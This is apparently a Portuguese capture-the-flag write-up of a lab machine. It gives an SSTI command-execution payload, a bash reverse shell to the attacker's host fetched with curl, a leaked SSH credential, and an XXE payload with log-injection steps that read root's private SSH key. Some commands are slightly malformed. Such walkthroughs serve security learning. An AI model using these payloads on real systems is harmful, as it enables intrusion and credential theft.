Enumeração de serviços:
![[Pasted image 20240206163037.png]]
Após alguns testes de injeção na barra de pesquisa do site, encontramos uma vulnerabilidade de SSTI (Server Side Template Injection) com o payload: `*{{7*7}}`.
![[Pasted image 20240206165400.png]]
Podemos executar comandos no alvo com o payload:
```python
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

Vamos pegar uma shell reversa da seguinte forma:
 1. Crie um script em bash com o payload `bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1` e extensão `.sh`.
2. Inicie um servidor http na máquina atacante com `python3 -m http.server 80`
3. Faça o download do script na máquina alvo na pasta temporária com `curl http://$LHOST/shell.sh -o /tmp/shell.sh`
4. Altere a permissão de execução do arquivo no alvo com `chmod +x /tmp/shell.sh`
5. Execute o script no alvo com `/bin/bash /tmp/shell.sh`

Agora com a shell, fazemos a enumeração dos arquivos em busca de credenciais no código da aplicação feita em Java com Spring Boot e encontramos no arquivo: `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
`
Agora é só logar via SSH:
`woodenk:RedPandazRule`

# Máquina muito hard

Necessário analisar os arquivos rodando periodicamente e analisar o arquivo: `/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java`
Com isso será possível identificar que o código faz um parse do log `/opt/panda_search/redpanda.log` buscando pelo caminho das imagens e retirando apenas o valor de Artist das imagens, para então concatenar esse valor em um XML. Dessa forma precisamos fazer um XXE alterando a tag Artist de uma imagem, incluindo o payload XXE para trazer o SSH do root e fazer um curl para manipular o caminho da imagem que será gravado no log.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY xxe SYSTEM 'file:///root/.ssh/id_rsa'>]>
<credits>
  <author>&xxe;</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>1</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```

Alterar o artist da imagem:
`exiftools -Artist='../tmp/hax smooch.jpg`

Suba os dois arquivos para a máquina alvo e altere o nome do XML para `hax_creds.xml`

Fazer o curl manipulando o User Agent do site:
`curl -A "evil||/../../../../../../../../../../tmp/smooch.jpg" http://10.10.11.170:8080/`
`
``